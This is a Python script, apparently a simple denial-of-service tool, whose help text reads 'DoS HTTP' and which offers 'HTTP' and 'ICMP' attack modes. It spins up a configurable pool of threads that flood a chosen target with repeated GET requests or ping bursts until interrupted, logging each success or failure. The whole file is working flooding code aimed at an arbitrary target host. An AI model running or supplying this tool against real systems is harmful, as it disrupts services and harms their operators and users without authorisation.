import subprocess
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from datetime import datetime

ICMP_ATTACK = "ICMP"
HTTP_ATTACK = "HTTP"
valid_attacks = {HTTP_ATTACK, ICMP_ATTACK}

parser = argparse.ArgumentParser(description="DoS HTTP")
parser.add_argument('-P', '--poolsize',  default=10, help='Size of the threadpool')
parser.add_argument('-T', '--target',  default='localhost', help='Target URL for http request')
parser.add_argument('-D', '--delay', default=0, help='Amount of time to wait between requests')
parser.add_argument('-A', '--attack', help='Type of attack (e.g. HTTP, ICMP)')

args = parser.parse_args()
threadpool_size = int(args.poolsize)
target = args.target
delay = int(args.delay)
attack = args.attack.upper()

if attack not in valid_attacks:
    print(f"Invalid attack type, must be one of: {valid_attacks}")
    exit()


terminate = False


def http_request(url):

    global terminate

    while True and not terminate:

        response = requests.get(url)
        if not response.ok:
            print(f"{str(datetime.now())[:-3]} !!! HTTP request failed, code: {response.status_code}")
        else:
            print(f"{str(datetime.now())[:-3]} ---> HTTP request successful")

        if delay > 0:
            for _ in range(0, delay): sleep(1)

    print("...http_request thread terminated")


def ping_host(ip):

    global terminate

    while True and not terminate:

        try:
            subprocess.check_output(["ping", "-c3", "-n", "-i0.5", "-W2", ip])
            print(f"{str(datetime.now())[:-3]} ---> Ping successful: {ip}")

        except subprocess.CalledProcessError:
            print(f"{str(datetime.now())[:-3]} !!!  Ping failed: {ip}")

        if delay > 0:
            for _ in range(0, delay): sleep(1)


def main():

    global terminate

    try:
        targets = [target for _ in range(0, threadpool_size)]
        with ThreadPoolExecutor(max_workers=threadpool_size) as executor:
            if attack == HTTP_ATTACK:
                executor.map(http_request, targets)
            elif attack == ICMP_ATTACK:
                executor.map(ping_host, targets)
            else:
                return  # should not have gotten here

    except KeyboardInterrupt:
        print("... terminating application ...", end="")
        terminate = True
        print("terminated")


if __name__ == "__main__":
    main()
